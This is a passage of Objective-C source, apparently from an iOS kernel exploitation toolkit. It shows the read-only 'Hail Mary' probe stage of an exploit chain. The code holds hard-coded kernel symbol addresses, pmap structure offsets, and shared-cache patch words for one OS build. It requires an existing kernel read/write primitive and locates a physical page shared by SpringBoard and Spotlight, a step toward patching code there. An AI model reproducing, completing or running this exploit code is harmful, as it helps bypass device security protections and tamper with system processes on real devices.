                    @"subcacheUUID": @CND_HAIL_MARY_SUBCACHE_UUID,
                    @"imageUUID": @CND_HAIL_MARY_IMAGE_UUID,
                    @"kernelUUID": @CND_HAIL_MARY_KERNEL_UUID,
                    @"offlineKernelSHA256":
                        @CND_HAIL_MARY_KERNEL_SHA256,
                    @"contextSHA256": @CND_HAIL_MARY_CONTEXT_SHA256,
                    @"unslidPatchAddress": CNDHailMaryHex(
                        kCNDHailMaryUnslidPatchAddress),
                    @"sharedRegionBase": CNDHailMaryHex(
                        kCNDHailMarySharedRegionBase),
                    @"sharedRegionOffset": CNDHailMaryHex(
                        kCNDHailMarySharedRegionOffset),
                    @"subcacheFileOffset": CNDHailMaryHex(
                        kCNDHailMarySubcacheFileOffset),
                    @"guardFileOffset": CNDHailMaryHex(
                        kCNDHailMaryGuardFileOffset),
                    @"guardByteLength": @(kCNDHailMaryGuardLength),
                    @"guardPatchOffset": @(kCNDHailMaryGuardPatchOffset),
                    @"pageSize": @(kCNDHailMaryPageSize),
                    @"subpageRootAlignment": @(
                        kCNDHailMarySubpageRootAlignment),
                    @"originalWord": CNDHailMaryHex(
                        kCNDHailMaryOriginalWord),
                    @"replacementWord": CNDHailMaryHex(
                        kCNDHailMaryReplacementWord),
                    @"kernelUnslidBase": CNDHailMaryHex(
                        kCNDHailMaryKernelUnslidBase),
                    @"kernelSymbols": @{
                        @"gVirtBase": CNDHailMaryHex(
                            kCNDHailMaryKernelGVirtBase),
                        @"gPhysBase": CNDHailMaryHex(
                            kCNDHailMaryKernelGPhysBase),
                        @"gPhysSize": CNDHailMaryHex(
                            kCNDHailMaryKernelGPhysSize),
                        @"physmapRangeState": CNDHailMaryHex(
                            kCNDHailMaryKernelPhysmapRangeState),
                        @"physmapRangeCountPointer": CNDHailMaryHex(
                            kCNDHailMaryKernelPhysmapRangeCountPointer),
                        @"physmapRangeRecordsPointer": CNDHailMaryHex(
                            kCNDHailMaryKernelPhysmapRangeRecordsPointer),
                    },
                    @"structureOffsets": @{
                        @"vm_map.pmap": @(kCNDHailMaryVMMapPmapOffset),
                        @"pmap.tte": @(kCNDHailMaryPmapTTEOffset),
                        @"pmap.ttep": @(kCNDHailMaryPmapTTEPOffset),
                        @"pmap.min": @(kCNDHailMaryPmapMinOffset),
                        @"pmap.max": @(kCNDHailMaryPmapMaxOffset),
                        @"pmap.pmap_pt_attr": @(
                            kCNDHailMaryPmapPTAttrOffset),
                    },
                },
                @"runtimeInstructionBytesVerified": @NO,
                @"runtimeCacheUUIDVerified": @NO,
            } mutableCopy];

            NSString *supportReason = nil;
            if (!CNDHailMaryProbeIsSupported(&supportReason)) {
                report[@"result"] = @"refused-unsupported-device";
                report[@"message"] = supportReason ?: @"Unsupported device.";
            } else if (!kexploit_krw_ready()) {
                report[@"result"] = @"refused-krw-unavailable";
                report[@"message"] = @"Validated KRW is required before the read-only observation stage.";
            } else if (!CNDHailMaryOffsetsMatch(report)) {
                report[@"result"] = @"refused-offset-layout-mismatch";
                report[@"message"] = @"The exact 23A341 kernel layout guard did not match.";
            } else {
                NSString *kernelIdentityError = nil;
                if (!CNDHailMaryValidateKernelIdentity(
                        report, &kernelIdentityError)) {
                    report[@"result"] = @"refused-kernel-identity-mismatch";
                    report[@"message"] = kernelIdentityError ?:
                        @"The live kernel did not match the exact offline artifact.";
                } else {
                    CNDHailMaryPhysicalMap physicalMap = {0};
                    NSString *physicalMapError = nil;
                    if (!CNDHailMaryLoadPhysicalMap(
                            &physicalMap, report, &physicalMapError)) {
                        report[@"result"] =
                            @"refused-physical-map-layout-mismatch";
                        report[@"message"] = physicalMapError ?:
                            @"The exact live physical-map layout was not validated.";
                    } else {
                        NSString *springBoardError = nil;
                        NSDictionary<NSString *, id> *springBoard =
                            CNDHailMaryInspectProcess(
                                "SpringBoard", &springBoardError);
                        if (!springBoard) {
                            report[@"result"] = @"springboard-inspection-failed";
                            report[@"message"] = springBoardError ?:
                                @"SpringBoard map inspection failed.";
                        } else {
                            report[@"springBoard"] = springBoard;
                            NSString *spotlightError = nil;
                            NSDictionary<NSString *, id> *spotlight =
                                CNDHailMaryInspectProcess(
                                    "Spotlight", &spotlightError);
                            if (!spotlight) {
                                report[@"result"] = [spotlightError
                                    isEqual:@"Spotlight-not-running"]
                                    ? @"spotlight-not-running"
                                    : @"spotlight-inspection-failed";
                                report[@"message"] = [spotlightError
                                    isEqual:@"Spotlight-not-running"]
                                    ? @"Open Spotlight so its process exists, then run the probe again."
                                    : (spotlightError ?:
                                        @"Spotlight map inspection failed.");
                            } else {
                                report[@"spotlight"] = spotlight;
                                NSDictionary<NSString *, id> *objectComparison =
                                    CNDHailMaryCompare(
                                        springBoard[@"candidates"],
                                        spotlight[@"candidates"]);
                                report[@"objectBackingComparison"] =
                                    objectComparison;
                                if (![objectComparison[@"confirmed"]
                                        boolValue]) {
                                    report[@"comparison"] = objectComparison;
                                    report[@"result"] =
                                        objectComparison[@"verdict"];
                                    report[@"message"] =
                                        @"The target backing identity was not proven uniquely; no physical translation or mutation was attempted.";
                                } else {
                                    NSDictionary<NSString *, id> *physicalProof =
                                        CNDHailMaryProvePhysicalPage(
                                            springBoard, spotlight,
                                            objectComparison, &physicalMap);
                                    report[@"physicalPageProof"] = physicalProof;
                                    NSMutableDictionary<NSString *, id> *comparison =
                                        [objectComparison mutableCopy];
                                    comparison[@"objectBackingConfirmed"] = @YES;
                                    comparison[@"confirmed"] =
                                        physicalProof[@"confirmed"] ?: @NO;
                                    comparison[@"physicalFrameResolved"] =
                                        physicalProof[@"physicalFrameResolved"] ?: @NO;
                                    comparison[@"samePhysicalFrame"] =
                                        physicalProof[@"samePhysicalFrame"] ?: @NO;
                                    comparison[@"physicalFrameStatus"] =
                                        physicalProof[@"verdict"] ?:
                                            @"physical-page-proof-failed";
                                    if (physicalProof[@"physicalFrame"]) {
                                        comparison[@"physicalFrame"] =
                                            physicalProof[@"physicalFrame"];
                                    }
                                    report[@"comparison"] = comparison;
                                    BOOL confirmed =
                                        [physicalProof[@"confirmed"] boolValue];
                                    report[@"runtimeInstructionBytesVerified"] =
                                        physicalProof[
                                            @"runtimeInstructionBytesVerified"] ?:
                                            @NO;
                                    report[@"result"] =
                                        physicalProof[@"verdict"] ?:
                                            @"physical-page-proof-failed";
                                    report[@"message"] =
                                        physicalProof[@"message"] ?:
                                            (confirmed
                                                ? @"Physical-page proof confirmed."
                                                : @"Physical-page proof failed closed.");
                                }
                            }
                        }
                    }
                }
            }

            CNDHailMarySaveReport(report, reportPath);
            NSDictionary<NSString *, id> *finished = [report copy];
            __sync_lock_release(&gCNDHailMaryProbeRunning);
            dispatch_async(dispatch_get_main_queue(), ^{
                completion(finished);
            });
        }
    });
}
